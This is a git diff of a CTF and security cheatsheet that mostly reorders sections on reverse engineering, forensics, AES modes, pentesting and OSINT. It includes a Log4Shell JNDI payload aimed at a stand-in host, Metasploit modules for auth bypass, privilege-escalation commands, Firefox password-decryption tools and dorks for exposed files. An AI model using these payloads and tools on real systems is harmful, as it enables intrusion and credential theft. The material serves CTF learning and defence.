@@ -368,9 +368,9 @@ RSYNC - 873/tcp
 
 # Reverse Engineering
 
+⇨ [Python](#python)<br>
 ⇨ [Binaries](#binaries)<br>
 ⇨ [Virtualization](#virtualization)<br>
-⇨ [Python](#python)<br>
 ⇨ [Android](#android)<br>
 
 
@@ -390,6 +390,34 @@ The [Binary Exploitation](Binary%20Exploitation) section, also known as PWN, is 
 * GameBoy ROMS
 
 	Packages to run GameBoy ROMS: `visualboyadvance` or `retroarch`
+
+
+## Python
+
+
+
+
+* `Decompile .pyc files`
+
+	Several software can be used to decompile python bytecode.
+
+	| Software | Source | Notes |
+	| --- | --- | --- |
+	| `uncompyle6` | [GitHub](https://github\.com/rocky/python-uncompyle6/) | Decompiles Python bytecode to equivalent Python source code. Support python versions **up to to 3.8**. Legend has it that it exists an option (maybe -d) that can succeed when the regular decompilation fails. |
+	| `Decompyle++` <span style="color:red">❤️</span> | [GitHub](https://github.com/zrax/pycdc) | Less reliable, but can decompile every python3 versions. |
+	| `Easy Python Decompiler` | [Website](https://sourceforge.net/projects/easypythondecompiler/) | Windows GUI to decompile python bytecode. |
+
+
+* `Pyinstaller Extractor` - [GitHub](https://github.com/extremecoders-re/pyinstxtractor)
+
+	Extracts the python bytecode from pyinstaller windows executables. Can be decomplied  after.
+
+	```bash
+	python3 pyinstxtractor.py <filename>
+	```
+
+	An alternative is `pydumpck`
+
 
 
 ## Binaries
@@ -506,34 +534,6 @@ In order to run some system, it is necessary to use virtualization.
 
 
 
-## Python
-
-
-
-
-* `Decompile .pyc files`
-
-	Several software can be used to decompile python bytecode.
-
-	| Software | Source | Notes |
-	| --- | --- | --- |
-	| `uncompyle6` | [GitHub](https://github\.com/rocky/python-uncompyle6/) | Decompiles Python bytecode to equivalent Python source code. Support python versions **up to to 3.8**. Legend has it that it exists an option (maybe -d) that can succeed when the regular decompilation fails. |
-	| `Decompyle++` <span style="color:red">❤️</span> | [GitHub](https://github.com/zrax/pycdc) | Less reliable, but can decompile every python3 versions. |
-	| `Easy Python Decompiler` | [Website](https://sourceforge.net/projects/easypythondecompiler/) | Windows GUI to decompile python bytecode. |
-
-
-* `Pyinstaller Extractor` - [GitHub](https://github.com/extremecoders-re/pyinstxtractor)
-
-	Extracts the python bytecode from pyinstaller windows executables. Can be decomplied  after.
-
-	```bash
-	python3 pyinstxtractor.py <filename>
-	```
-
-	An alternative is `pydumpck`
-
-
-
 ## Android
 
 
@@ -574,8 +574,8 @@ In order to run some system, it is necessary to use virtualization.
 
 # Binary Exploitation
 
-⇨ [ELF](#elf)<br>
 ⇨ [Windows](#windows)<br>
+⇨ [ELF](#elf)<br>
 
 
 Binary exploitation, also known as **pwn**, is the art of exploiting vulnerable programs. This means that given a program, often running on a remote server, an attacker is able to take control of the execution flow of the program only using limited user input. The goal of the attacker is usually to get a shell on the remote server, but it sometimes not necessary to compromise the server.
@@ -642,29 +642,6 @@ Common tools to exploit binaries:
     [CTF time WU](https://ctftime.org/writeup/7670)<br>
     [DGHack 2022 WU](https://remyoudompheng.github.io/ctf/dghack2022/wanna_more_features.html)
 
-## ELF
-
-
-
-* `checksec` [Docs](https://docs.pwntools.com/en/stable/commandline.html)
-
-    A command-line tool that will check the security mechanisms of a binary.
-    
-* `pwntools` [Docs](https://docs.pwntools.com/en/stable/about.html)
-
-    A python library that can be used to interact with a binary.
-
-* `ROPgadget` - [GitHub](https://github.com/JonathanSalwan/ROPgadget)  [Pypi](https://pypi.org/project/ROPGadget/)
-
-    A command-line tool that can be used to find gadgets in a binary.
-
-* `ropper` - [GitHub](https://github.com/sashs/Ropper)
-
-    A command-line tool that can be used to find gadgets in a binary.
-
-
-
-
 ## Windows
 
 
@@ -722,6 +699,29 @@ Common tools to exploit binaries:
 * `AutoIt` - [Website](https://www.autoitscript.com/site/autoit/)
 
 	Scripting language for Windows.
+
+
+
+## ELF
+
+
+
+* `checksec` [Docs](https://docs.pwntools.com/en/stable/commandline.html)
+
+    A command-line tool that will check the security mechanisms of a binary.
+    
+* `pwntools` [Docs](https://docs.pwntools.com/en/stable/about.html)
+
+    A python library that can be used to interact with a binary.
+
+* `ROPgadget` - [GitHub](https://github.com/JonathanSalwan/ROPgadget)  [Pypi](https://pypi.org/project/ROPGadget/)
+
+    A command-line tool that can be used to find gadgets in a binary.
+
+* `ropper` - [GitHub](https://github.com/sashs/Ropper)
+
+    A command-line tool that can be used to find gadgets in a binary.
+
 
 
 <br><br>
@@ -819,6 +819,11 @@ File scanning is the process of analyzing a, potentially large, file to find inf
     | `50 4B` (PK) | ZIP | [ZIP](https://en.wikipedia.org/wiki/Zip_(file_format)) archive |
 
     For exemple, the first 16 bytes of PNG are usually b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR'
+
+    This data can be outputed to a file with 
+    ```bash
+    echo -n -e "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" > png.sig
+    ```
 
 
 
@@ -935,9 +940,20 @@ File scanning is the process of analyzing a, potentially large, file to find inf
     john --wordlist=/usr/share/wordlists/rockyou.txt protected.john
     ```
 
-* `bkcrack` - [GitHub](https://github\.com/kimci86/bkcrack)
+* `bkcrack` - [GitHub](https://github.com/kimci86/bkcrack)
 
-    Crack ZipCrypto Store files. Need some plaintext to work.
+    Crack ZipCrypto Store files. Need some plaintext (~9bytes) to work.
+
+    Usage:
+    ``` bash
+    bkcrack -L encrypted.zip # List all files in the zip
+    bkcrack -C encrypted.zip -c zipped_file.png -p plain.png # Crack the zip when "store" method is used
+    bkcrcak -C encrypted.zip -c zipped_file.png -k key -D out.zip # Decipher the zip with the key
+    ```
+
+    See [File signatures](#file-scanning) to generate the first 9 bytes of the file.  
+    You can use `echo -n -e "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" > plain.png` to generate the signature of a PNG file.
+
 
 * `Reading the specifications`
 
@@ -951,10 +967,10 @@ File scanning is the process of analyzing a, potentially large, file to find inf
 # Forensics
 
 ⇨ [Disk Image](#disk-image)<br>
-⇨ [Browser Forensics](#browser-forensics)<br>
 ⇨ [Logs](#logs)<br>
-⇨ [Android Forensics](#android-forensics)<br>
+⇨ [Browser Forensics](#browser-forensics)<br>
 ⇨ [Memory Dump](#memory-dump)<br>
+⇨ [Android Forensics](#android-forensics)<br>
 ⇨ [Docker](#docker)<br>
 
 
@@ -991,6 +1007,13 @@ File scanning is the process of analyzing a, potentially large, file to find inf
 	Windows stores information about the programs that are run in a prefetch file. This information can be used to determine what programs were run on a system. The prefetch files are stored in `C:\Windows\Prefetch\` and have the extension `.pf`. 
 	
 	It can be parsed using `PECmd` from [Eric Zimmerman's tools](https://ericzimmerman.github.io/#!index.md). Win10 prefetch files can only be parsed on Win8+ systems, wine will not work for this.
+
+* `USB capture`
+
+	`Wireshark` can be used to display USB traffic in `.pcap` or `.pcapng` files. Some github repositories can be used to convert it to keyboard keystrokes:
+
+	- [ctf-usb-keyboard-parser](https://github.com/TeamRocketIst/ctf-usb-keyboard-parser)
+	- [CTF-Usb_Keyboard_Parser](https://github.com/TeamRocketIst/ctf-usb-keyboard-parser) <span style="color:red">❤️</span>
 
 ## Disk Image
 
@@ -1034,80 +1057,6 @@ File scanning is the process of analyzing a, potentially large, file to find inf
 	wimapply <file.wim> <image_index> <output_directory> # Extract an image from the wim file
 	``` 
 
-
-
-
-
-
-## Browser Forensics
-
-⇨ [Firefox profiles](#firefox-profiles)<br>
-
-
-The browser profile contains a lot of information about the user, such as bookmarks, history, cookies, stored passwords, etc.
-
-
-* Profile location
-    
-    In Windows:
-    | Browser | Location |
-    | --- | --- |
-    | Chrome | `C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default` |
-    | [Firefox](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data) | `C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>` |
-    | Edge | `C:\Users\<username>\AppData\Local\Microsoft\Edge\User Data\Default` |
-
-    In Linux:
-    | Browser | Location |
-    | --- | --- |
-    | Chrome | `~/.config/google-chrome/Default` |
-    | [Firefox](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data) | `~/.mozilla/firefox/<profile>` |
-
-
-
-
-### Firefox profiles
-
-
-
-Firefox based browsers (and Thunderbird) store their profiles in the following files in the profile folder (usually `XXXXXXXX.default`):
-
-| File | Description |
-| --- | --- |
-| `places.sqlite` | Bookmarks, history, cookies, etc... |
-| `keyN.db` with N=3 or 4 | Master password, used to encrypt the stored passwords |
-| `signons.sqlite` or `logins.json` | Stored passwords |
-| `certN.db` with N=8 or 9 | Certificates |
-
-* `Dumpzilla` <span style="color:red">❤️</span> - [GitHub](https://github.com/Busindre/dumpzilla)
-
-    Dumps everything from a Firefox profile. 
-
-    ```bash
-    python3 dumpzilla.py /path/to/your-profile/
-    ```
-    
-    Uses [NSS](https://en.wikipedia.org/wiki/Network_Security_Services) to decrypt passwords, which can be hard to install.
-
-
-* `Firefox decrypt` - [GitHub](https://github.com/unode/firefox_decrypt)
-
-    Decrypts passwords from Firefox. Better support than dumpzilla but don't handle legacy profiles (key3.db).
-
-    ```bash
-    python3 firefox_decrypt.py /path/to/your-profile/
-    ```
-
-    Uses [NSS](https://en.wikipedia.org/wiki/Network_Security_Services) to decrypt passwords, which can be hard to install. Similar to [nss-password](https://github.com/glondu/nss-passwords) which can be installed with a .deb file.
-
-* `FirePWD` - [GitHub](https://github.com/lclevy/firepwd)
-
-    Decrypt all types of firefox passwords (including legacy).
-
-    ```bash
-    python3 firepwd.py -d /path/to/your-profile/
-    ```
-
-    It does not use [NSS](https://en.wikipedia.org/wiki/Network_Security_Services) to decrypt passwords, which makes it easier to install. Found this tool [here](https://security.stackexchange.com/questions/152285/command-line-tools-to-decrypt-my-firefox-45-7-0-passwords-using-key3-db-and-logi).
 
 
 
@@ -1187,13 +1136,77 @@ Looking at logs takes time but can lead to valuable information.
 
 
 
-## Android Forensics
+## Browser Forensics
+
+⇨ [Firefox profiles](#firefox-profiles)<br>
+
+
+The browser profile contains a lot of information about the user, such as bookmarks, history, cookies, stored passwords, etc.
+
+
+* Profile location
+    
+    In Windows:
+    | Browser | Location |
+    | --- | --- |
+    | Chrome | `C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default` |
+    | [Firefox](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data) | `C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>` |
+    | Edge | `C:\Users\<username>\AppData\Local\Microsoft\Edge\User Data\Default` |
+
+    In Linux:
+    | Browser | Location |
+    | --- | --- |
+    | Chrome | `~/.config/google-chrome/Default` |
+    | [Firefox](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data) | `~/.mozilla/firefox/<profile>` |
 
 
 
-* `Gesture cracking`
 
-    The gesture needed to unlock the phone is stored in `/data/system/gesture.key` as a SHA1 hash of the gesture. [This python script](Forensics/Android Forensics/Tools/gesture_cracker.py) or [this C program](Forensics/Android Forensics/Tools/gesture_cracker.c) can be used to crack the gesture, .
+### Firefox profiles
+
+
+
+Firefox based browsers (and Thunderbird) store their profiles in the following files in the profile folder (usually `XXXXXXXX.default`):
+
+| File | Description |
+| --- | --- |
+| `places.sqlite` | Bookmarks, history, cookies, etc... |
+| `keyN.db` with N=3 or 4 | Master password, used to encrypt the stored passwords |
+| `signons.sqlite` or `logins.json` | Stored passwords |
+| `certN.db` with N=8 or 9 | Certificates |
+
+* `Dumpzilla` <span style="color:red">❤️</span> - [GitHub](https://github.com/Busindre/dumpzilla)
+
+    Dumps everything from a Firefox profile. 
+
+    ```bash
+    python3 dumpzilla.py /path/to/your-profile/
+    ```
+    
+    Uses [NSS](https://en.wikipedia.org/wiki/Network_Security_Services) to decrypt passwords, which can be hard to install.
+
+
+* `Firefox decrypt` - [GitHub](https://github.com/unode/firefox_decrypt)
+
+    Decrypts passwords from Firefox. Better support than dumpzilla but don't handle legacy profiles (key3.db).
+
+    ```bash
+    python3 firefox_decrypt.py /path/to/your-profile/
+    ```
+
+    Uses [NSS](https://en.wikipedia.org/wiki/Network_Security_Services) to decrypt passwords, which can be hard to install. Similar to [nss-password](https://github.com/glondu/nss-passwords) which can be installed with a .deb file.
+
+* `FirePWD` - [GitHub](https://github.com/lclevy/firepwd)
+
+    Decrypt all types of firefox passwords (including legacy).
+
+    ```bash
+    python3 firepwd.py -d /path/to/your-profile/
+    ```
+
+    It does not use [NSS](https://en.wikipedia.org/wiki/Network_Security_Services) to decrypt passwords, which makes it easier to install. Found this tool [here](https://security.stackexchange.com/questions/152285/command-line-tools-to-decrypt-my-firefox-45-7-0-passwords-using-key3-db-and-logi).
+
+
 
 
 
@@ -1329,6 +1342,16 @@ The full documentation can be found [here](https://volatility3.readthedocs.io)
 
 
 
+
+
+
+## Android Forensics
+
+
+
+* `Gesture cracking`
+
+    The gesture needed to unlock the phone is stored in `/data/system/gesture.key` as a SHA1 hash of the gesture. [This python script](Forensics/Android Forensics/Tools/gesture_cracker.py) or [this C program](Forensics/Android Forensics/Tools/gesture_cracker.c) can be used to crack the gesture, .
 
 
 
@@ -1944,11 +1967,11 @@ If $r = 0$ or $s = 0$, do it again with another $k$. The signature is $(r, s)$.
 
 ### AES
 
-⇨ [AES - OFB Mode](#aes---ofb-mode)<br>
-⇨ [AES - ECB Mode](#aes---ecb-mode)<br>
 ⇨ [AES - CBC Mode](#aes---cbc-mode)<br>
-⇨ [AES - GCM Mode](#aes---gcm-mode)<br>
+⇨ [AES - ECB Mode](#aes---ecb-mode)<br>
+⇨ [AES - OFB Mode](#aes---ofb-mode)<br>
 ⇨ [AES - CTR Mode](#aes---ctr-mode)<br>
+⇨ [AES - GCM Mode](#aes---gcm-mode)<br>
 
 
 [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) A.K.A. Rijndael is a **symmetric** cryptographic algorithm. It uses the **same key** for encryption and decryption.
@@ -1995,47 +2018,6 @@ The most common block operation modes are:
 
 	[CryptoHack](https://cryptohack.org/challenges/beatboxer/solutions/) - CryptoHack challenge with an affine sbox and only one message.
 
-#### AES - OFB Mode
-
-
-
-[AES Output FeedBack](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Output_feedback_(OFB)) is an unusual stream cipher. It has no real benefits these days over CTR mode. Indeed CTR can be computed in parallel and allows random access in the ciphertext whereas OFB cannot.
-
-###### Definition
-
-![OFB Encryption](Cryptography/Symetric/AES/AES - OFB Mode/_img/601px-OFB_encryption.png#gh-light-mode-only)
-![OFB Encryption](Cryptography/Symetric/AES/AES - OFB Mode/_img/601px-OFB_encryption-dark.png#gh-dark-mode-only)
-![OFB Decryption](Cryptography/Symetric/AES/AES - OFB Mode/_img/601px-OFB_decryption.png#gh-light-mode-only)
-![OFB Decryption](Cryptography/Symetric/AES/AES - OFB Mode/_img/601px-OFB_decryption-dark.png#gh-dark-mode-only)
-
-
-
-#### AES - ECB Mode
-
-
-
-[AES Electronic CodeBook](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)) is the most basic mode of operation. Each block is encrypted independently of the others.  This is considered **unsecure** for most applications.
-
-###### Definition
-
-![ECB Encryption](Cryptography/Symetric/AES/AES - ECB Mode/_img/601px-ECB_encryption.png#gh-light-mode-only)
-![ECB Encryption](Cryptography/Symetric/AES/AES - ECB Mode/_img/601px-ECB_encryption-dark.png#gh-dark-mode-only)
-![ECB Decryption](Cryptography/Symetric/AES/AES - ECB Mode/_img/601px-ECB_decryption.png#gh-light-mode-only)
-![ECB Decryption](Cryptography/Symetric/AES/AES - ECB Mode/_img/601px-ECB_decryption-dark.png#gh-dark-mode-only)
-
-###### Attacks
-
-* ECB Encryption Oracle padded with secret - [CryptoHack](https://cryptohack.org/courses/symmetric/ecb_oracle/)
-
-	To leak the secret, we can use the fact that ECB mode is stateless. We can compare the output of a block containing one unknown byte of the secret with all 256 possible outputs. The block that encrypts to the correct output is the one that contains the unknown byte.
-
-* ECB Decryption Oracle - [CryptoHack](https://cryptohack.org/courses/symmetric/ecbcbcwtf/)
-
-	A ECB decryption oracle can simply be used as an AES block decoder. Many modes can be compromised by this oracle.
-	
-
-
-
 #### AES - CBC Mode
 
 
@@ -2068,6 +2050,65 @@ The most common block operation modes are:
 
 
 
+#### AES - ECB Mode
+
+
+
+[AES Electronic CodeBook](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)) is the most basic mode of operation. Each block is encrypted independently of the others.  This is considered **unsecure** for most applications.
+
+###### Definition
+
+![ECB Encryption](Cryptography/Symetric/AES/AES - ECB Mode/_img/601px-ECB_encryption.png#gh-light-mode-only)
+![ECB Encryption](Cryptography/Symetric/AES/AES - ECB Mode/_img/601px-ECB_encryption-dark.png#gh-dark-mode-only)
+![ECB Decryption](Cryptography/Symetric/AES/AES - ECB Mode/_img/601px-ECB_decryption.png#gh-light-mode-only)
+![ECB Decryption](Cryptography/Symetric/AES/AES - ECB Mode/_img/601px-ECB_decryption-dark.png#gh-dark-mode-only)
+
+###### Attacks
+
+* ECB Encryption Oracle padded with secret - [CryptoHack](https://cryptohack.org/courses/symmetric/ecb_oracle/)
+
+	To leak the secret, we can use the fact that ECB mode is stateless. We can compare the output of a block containing one unknown byte of the secret with all 256 possible outputs. The block that encrypts to the correct output is the one that contains the unknown byte.
+
+* ECB Decryption Oracle - [CryptoHack](https://cryptohack.org/courses/symmetric/ecbcbcwtf/)
+
+	A ECB decryption oracle can simply be used as an AES block decoder. Many modes can be compromised by this oracle.
+	
+
+
+
+#### AES - OFB Mode
+
+
+
+[AES Output FeedBack](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Output_feedback_(OFB)) is an unusual stream cipher. It has no real benefits these days over CTR mode. Indeed CTR can be computed in parallel and allows random access in the ciphertext whereas OFB cannot.
+
+###### Definition
+
+![OFB Encryption](Cryptography/Symetric/AES/AES - OFB Mode/_img/601px-OFB_encryption.png#gh-light-mode-only)
+![OFB Encryption](Cryptography/Symetric/AES/AES - OFB Mode/_img/601px-OFB_encryption-dark.png#gh-dark-mode-only)
+![OFB Decryption](Cryptography/Symetric/AES/AES - OFB Mode/_img/601px-OFB_decryption.png#gh-light-mode-only)
+![OFB Decryption](Cryptography/Symetric/AES/AES - OFB Mode/_img/601px-OFB_decryption-dark.png#gh-dark-mode-only)
+
+
+
+#### AES - CTR Mode
+
+
+
+[AES Counter Mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_(CTR)) is using the AES output as a xor key. To generate the output a nonce is used, modified by a counter (concatenated, summed ...) at each block.
+
+The main problem with this mode is that the nonce must be unique for each message, and the counter must be different for each block (it can be reset at each message). If this is not the case, the xor key will be the same for different blocks, which can compromise the encrypted message. (See the weaknesses of [XOR encryption](#..)
+
+###### Definition
+
+![CTR Encryption](Cryptography/Symetric/AES/AES - CTR Mode/_img/601px-CTR_encryption_2.png#gh-light-mode-only)
+![CTR Encryption](Cryptography/Symetric/AES/AES - CTR Mode/_img/601px-CTR_encryption_2-dark.png#gh-dark-mode-only)
+![CTR Decryption](Cryptography/Symetric/AES/AES - CTR Mode/_img/601px-CTR_decryption_2.png#gh-light-mode-only)
+![CTR Decryption](Cryptography/Symetric/AES/AES - CTR Mode/_img/601px-CTR_decryption_2-dark.png#gh-dark-mode-only)
+
+
+
+
 #### AES - GCM Mode
 
 
@@ -2092,24 +2133,6 @@ The most common block operation modes are:
     [GitHub (Crypton)](https://github.com/ashutosh1206/Crypton/tree/master/Authenticated-Encryption/AES-GCM/Attack-Forbidden) - Summary of the attack.
 
     [This custom python script](Cryptography/Symetric/AES/AES - GCM Mode/Tools/forbidden_attack.py) gives an example implementation of the attack.
-
-
-
-#### AES - CTR Mode
-
-
-
-[AES Counter Mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_(CTR)) is using the AES output as a xor key. To generate the output a nonce is used, modified by a counter (concatenated, summed ...) at each block.
-
-The main problem with this mode is that the nonce must be unique for each message, and the counter must be different for each block (it can be reset at each message). If this is not the case, the xor key will be the same for different blocks, which can compromise the encrypted message. (See the weaknesses of [XOR encryption](#..)
-
-###### Definition
-
-![CTR Encryption](Cryptography/Symetric/AES/AES - CTR Mode/_img/601px-CTR_encryption_2.png#gh-light-mode-only)
-![CTR Encryption](Cryptography/Symetric/AES/AES - CTR Mode/_img/601px-CTR_encryption_2-dark.png#gh-dark-mode-only)
-![CTR Decryption](Cryptography/Symetric/AES/AES - CTR Mode/_img/601px-CTR_decryption_2.png#gh-light-mode-only)
-![CTR Decryption](Cryptography/Symetric/AES/AES - CTR Mode/_img/601px-CTR_decryption_2-dark.png#gh-dark-mode-only)
-
 
 
 
@@ -2441,8 +2464,9 @@ See the [Diffie-Hellman section](#diffie-hellman) for more information on the ke
     MD5 is know to have collision issues. For exemple, it is very easy to find two byte strings with a given prefix that have the same MD5 hash.
 
     See these github repositories for more information:
-    - [collisions](https://github.com/corkami/collisions)
-    - [hashclash](https://github.com/cr-marcstevens/hashclash)
+    - [collisions](https://github.com/corkami/collisions) (descriptions of the attacks)
+    - [hashclash](https://github.com/cr-marcstevens/hashclash) (hard to build)
+    - [md5collgen](https://github.com/zhijieshi/md5collgen) (updated version of hashclash)
 
 * MD5 length extension - [GitHub](https://github.com/iagox86/hash_extender)
 
@@ -3015,13 +3039,109 @@ Where:
 
 # Pentest
 
-⇨ [Reverse Shell](#reverse-shell)<br>
 ⇨ [Tricks](#tricks)<br>
 ⇨ [Common Exploits](#common-exploits)<br>
 ⇨ [Privilege Escalation](#privilege-escalation)<br>
+⇨ [Reverse Shell](#reverse-shell)<br>
 
 
 This section describes common techniques used to pentest an infrastructure. As pentesting is not the main focus of this repository, I recommend using [HackTricks](https://book.hacktricks.xyz) for more pentesting-oriented content.
+
+## Tricks
+
+
+
+Pentesting requires a lot of creativity and out-of-the-box thinking. Here are some tricks that can help you in your journey.
+
+#### Tricks
+
+* Visual studio code server
+
+    Installing a visual studio code server on the target machine can help you in editing files and running commands on the target machine. You can use the following command to install the server on the target machine. It can be easily installed over ssh.
+
+    
+
+    
+
+
+
+## Common Exploits
+
+
+
+* `Heartbleed`
+
+	Metasploit module: `auxiliary/scanner/ssl/openssl_heartbleed`
+
+	Be sure to use `set VERBOSE true` to see the retrieved results. This can often contain a flag or some valuable information.
+
+* `libssh - SSH`
+
+	`libssh0.8.1` (or others??) is vulnerable to an easy and immediate login. Metasploit module: `auxiliary/scanner/ssh/libssh_auth_bypass`. Be sure to `set spawn_pty true` to actually receive a shell! Then `sessions -i 1` to interact with the shell spawned (or whatever appropriate ID)
+
+* `Default credentials` - [CheatSheet](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)
+
+    Unconfigured system can use the default credentials to login.
+
+* `Log4Shell`
+
+	Exploit on the Java library **Log4j**. Malicious code is fetched and executed from a remote JNDI server. A payload looks like `${jndi:ldap://example.com:1389/a}` and need to be parsed by Log4j.
+
+	- [Simple POC](https://github.com/kozmer/log4j-shell-poc)
+	
+	- [JNDI Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)
+
+	- [ECW2022 author's WU](https://gist.github.com/Amossys-team/e99cc3b979b30c047e6855337fec872e#web---not-so-smart-api)
+
+	- [Request Bin](https://requestbin.net/) Useful for detection and environment variable exfiltration.
+
+
+
+## Privilege Escalation
+
+
+
+* `sudo`
+
+    First thing to check. See what the current user is allowed to do.
+    ```bash
+    sudo -l # List available commands
+    ```
+
+
+* `PEAS` <span style="color:red">❤️</span> - [GitHub](https://github\.com/carlospolop/PEASS-ng)
+
+    Find common misconfigurations and vulnerabilities in Linux and Windows.
+
+    Send linpeas via ssh
+    ```bash	
+    scp linpeas.sh user@domain:/tmp
+    ```
+
+
+* setuid Files
+
+    Files with the setuid bit set are executed with the permissions of the owner of the file, not the user who started the program. This can be used to escalate privileges.
+
+    [GTFOBins](https://gtfobins.github.io/) has a list of setuid binaries that can be used to escalate privileges.
+
+    Custom setuid files can be exploited using [binary exploitation](#binary-exploitation).
+
+
+    Find files with the setuid bit set.
+    ``` bash
+    find / -perm -u=s -type f 2>/dev/null
+    ```
+
+* `CVE-2021-3156` - [Website](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156)
+
+    sudo versions before **1.9.5p2** are vulnerable to a heap-based buffer overflow. This can be exploited to gain root access. Very useful on older systems.
+
+    Some payload can be found in the [Tools](Pentest/Privilege Escalation/Tools/CVE-2021-3156/) section.
+
+
+
+
 
 ## Reverse Shell
 
@@ -3124,102 +3244,6 @@ Sometimes both types of shells are wrongly called `reverse shell`.
 
     Check [this github repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) for more bind shells.
 
-
-
-
-
-
-## Tricks
-
-
-
-Pentesting requires a lot of creativity and out-of-the-box thinking. Here are some tricks that can help you in your journey.
-
-#### Tricks
-
-* Visual studio code server
-
-    Installing a visual studio code server on the target machine can help you in editing files and running commands on the target machine. You can use the following command to install the server on the target machine. It can be easily installed over ssh.
-
-    
-
-    
-
-
-
-## Common Exploits
-
-
-
-* `Heartbleed`
-
-	Metasploit module: `auxiliary/scanner/ssl/openssl_heartbleed`
-
-	Be sure to use `set VERBOSE true` to see the retrieved results. This can often contain a flag or some valuable information.
-
-* `libssh - SSH`
-
-	`libssh0.8.1` (or others??) is vulnerable to an easy and immediate login. Metasploit module: `auxiliary/scanner/ssh/libssh_auth_bypass`. Be sure to `set spawn_pty true` to actually receive a shell! Then `sessions -i 1` to interact with the shell spawned (or whatever appropriate ID)
-
-* `Default credentials` - [CheatSheet](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)
-
-    Unconfigured system can use the default credentials to login.
-
-* `Log4Shell`
-
-	Exploit on the Java library **Log4j**. Malicious code is fetched and executed from a remote JNDI server. A payload looks like `${jndi:ldap://example.com:1389/a}` and need to be parsed by Log4j.
-
-	- [Simple POC](https://github.com/kozmer/log4j-shell-poc)
-	
-	- [JNDI Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)
-
-	- [ECW2022 author's WU](https://gist.github.com/Amossys-team/e99cc3b979b30c047e6855337fec872e#web---not-so-smart-api)
-
-	- [Request Bin](https://requestbin.net/) Useful for detection and environment variable exfiltration.
-
-
-
-## Privilege Escalation
-
-
-
-* `sudo`
-
-    First thing to check. See what the current user is allowed to do.
-    ```bash
-    sudo -l # List available commands
-    ```
-
-
-* `PEAS` <span style="color:red">❤️</span> - [GitHub](https://github\.com/carlospolop/PEASS-ng)
-
-    Find common misconfigurations and vulnerabilities in Linux and Windows.
-
-    Send linpeas via ssh
-    ```bash	
-    scp linpeas.sh user@domain:/tmp
-    ```
-
-
-* setuid Files
-
-    Files with the setuid bit set are executed with the permissions of the owner of the file, not the user who started the program. This can be used to escalate privileges.
-
-    [GTFOBins](https://gtfobins.github.io/) has a list of setuid binaries that can be used to escalate privileges.
-
-    Custom setuid files can be exploited using [binary exploitation](#binary-exploitation).
-
-
-    Find files with the setuid bit set.
-    ``` bash
-    find / -perm -u=s -type f 2>/dev/null
-    ```
-
-* `CVE-2021-3156` - [Website](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156)
-
-    sudo versions before **1.9.5p2** are vulnerable to a heap-based buffer overflow. This can be exploited to gain root access. Very useful on older systems.
-
-    Some payload can be found in the [Tools](Pentest/Privilege Escalation/Tools/CVE-2021-3156/) section.
 
 
 
@@ -3569,10 +3593,10 @@ Many steganography implementations exists. Here is a list of some of them.
 # OSINT
 
 ⇨ [Email](#email)<br>
-⇨ [Dorking](#dorking)<br>
 ⇨ [Images](#images)<br>
 ⇨ [Map](#map)<br>
 ⇨ [Username](#username)<br>
+⇨ [Dorking](#dorking)<br>
 
 
 * `Wayback machine` - [Website](https://archive.org/)
@@ -3593,49 +3617,6 @@ Many steganography implementations exists. Here is a list of some of them.
     A gmail address can be used to query public information on google services like Google Maps reviews or Google Calendar events. [Epieos](https://epieos.com) can find such services.
 
 
-
-
-
-## Dorking
-
-
-
-Dorking is the process of using search engines to find information about a target.
-
-
-* `Google Dorks` - [Wikipedia](https://en.wikipedia.org/wiki/Google_hacking) [CheatSheet](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06) 
-
-    Use Google's search engine to find indexed pages that contain specific information.
-    provides detailed information about Google Dorks.
-
-    The most common ones are:
-    ```bash
-    site:example.com           # Search for a specific domain
-    inurl: "ViewerFrame?Mode=" # Search for a specific string in the URL (exposed webcams)
-    intitle: "index of"        # Search for a specific string in the title of the page (exposed dirs)
-    filetype:pdf               # Search for a specific file type
-    ```
-
-* `Github Dorks`
-
-    Use Github's search engine to find indexed files that contain specific information. [This documentation](https://docs.github.com/en/search-github/searching-on-github) can be used to craft search queries.
-
-    Github users can be tracked using [Gitive](https://github.com/mxrch/GitFive).
-
-    The most common dork keywords are:
-    ```bash
-    filename:passwords.txt     # Search for a specific filename
-    extension:txt              # Search for a specific file extension
-    owner:username             # Search for a specific username
-    
-    # In commits
-    author-name:username       # Search for a specific commit author
-    author-email:u@ex.com      # Search for a specific commit author email
-    committer-name:username    # Search for a specific committer
-    committer-email:u@ex.com   # Search for a specific committer email
-    ```
-
-    
 
 
 
@@ -3705,18 +3686,163 @@ Dorking is the process of using search engines to find information about a targe
 
 
 
+
+## Dorking
+
+
+
+Dorking is the process of using search engines to find information about a target.
+
+
+* `Google Dorks` - [Wikipedia](https://en.wikipedia.org/wiki/Google_hacking) [CheatSheet](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06) 
+
+    Use Google's search engine to find indexed pages that contain specific information.
+    provides detailed information about Google Dorks.
